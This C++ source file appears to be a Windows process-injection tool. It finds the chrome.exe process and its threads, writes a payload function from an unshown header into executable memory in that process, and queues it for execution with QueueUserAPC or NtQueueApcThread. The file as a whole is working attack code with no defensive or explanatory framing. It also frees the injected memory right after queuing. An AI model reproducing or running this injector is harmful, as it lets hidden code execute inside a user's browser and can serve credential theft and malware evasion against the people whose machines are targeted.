//                  APC - PROCESS INJECTION METHOD

#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include "header.h"

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
using namespace std;

LPVOID      EXECUTER;
ULONG       EXE_SIZE;

void get_executer_details(){
    LPBYTE  p;                          // auxilary pointer
	DWORD old;
    //VirtualProtect((LPVOID)((ULONG)executer), 0x8000, PAGE_EXECUTE_READWRITE, &old );
	//EXECUTER =  (LPBYTE)((ULONG)Papcfunc + *(LPDWORD)((ULONG)Papcfunc + 1) + 5);
	EXECUTER = Papcfunc;
    for( p=(LPBYTE)EXECUTER; strcmp((char*)p, "SelfQueuing_end$$$"); p++ )
        ;
    EXE_SIZE = (ULONG)p + 19 + 9 - (ULONG)EXECUTER;               // get function size

}


bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
                cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                            cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void inject(char* process){
    DWORD pid;
    vector<DWORD> tids;
    LPVOID exe = EXECUTER;
    ULONG size = EXE_SIZE;

    if (FindProcess(process, pid, tids)) {
        HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
        if(hProcess==NULL){
            cout<<"[!] failed to get handle for process: "<<pid<<endl;
            return;
        }
        auto p = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(p==NULL) {
            cout<<"[!] memory allocation failed! Error: "<<GetLastError()<<endl;
            return ;
        }else{cout<<"[+] virtual mem allocation success"<<endl;}
        unsigned long injectedFn = (unsigned long)p;
        cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;

        if(::WriteProcessMemory(hProcess, p, exe, size, NULL)==0){
            DWORD err = GetLastError();
            cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
            return ;
        }else{cout<<"[+] write to process success"<<endl;}
        // cout<<"[+] Sleeping for 15s"<<endl;
        // Sleep(15000);

        for(vector<DWORD>::size_type i = 2; i != tids.size(); i++) {
            DWORD tid = tids[i];
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
            cout<<endl;
            ULONG_PTR parameter = 0; //nothing!
            if (hThread!=NULL) {
#ifndef __USE_NT_FUNCTIONS__
                if(QueueUserAPC(
                    (PAPCFUNC)p,
                    hThread, 
                    parameter)==0){
                    cout<<"[!] failed to queue user apc"<<endl;
                }
#else
				HMODULE hNtdll = GetModuleHandleA("ntdll");
			    if (hNtdll == NULL) {
					cout<<"[!] Failed to find module 'ntdll' "<<endl;
					return;
				}
				NTSTATUS (NTAPI *NtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, ULONG);
				NtQueueApcThread = (NT_QUEUE_APC_THREAD) GetProcAddress(hNtdll,"NtQueueApcThread");
				if(NtQueueApcThread==NULL){
					cout<<"[!] Failed to get the address of NtQueueApcThread()"<<endl;
					return;
				}
				if(NtQueueApcThread(hThread, p, NULL, NULL, NULL)!=0){
					cout<<"[!] APC Queueing Failed"<<endl;
				}
#endif
				else{
                    cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
                }
            }
            else{
                cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
                return;
            }
            //break;
        }
        ::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
        cout<<"[+] VirtualFreeEx"<<endl;
    }
    else{
        cout<<"[!] specified process not found"<<endl;
    }
}

void main(int argc, char* argv[]){
	get_executer_details();
    inject("chrome.exe");
	cin.get();
    return;
}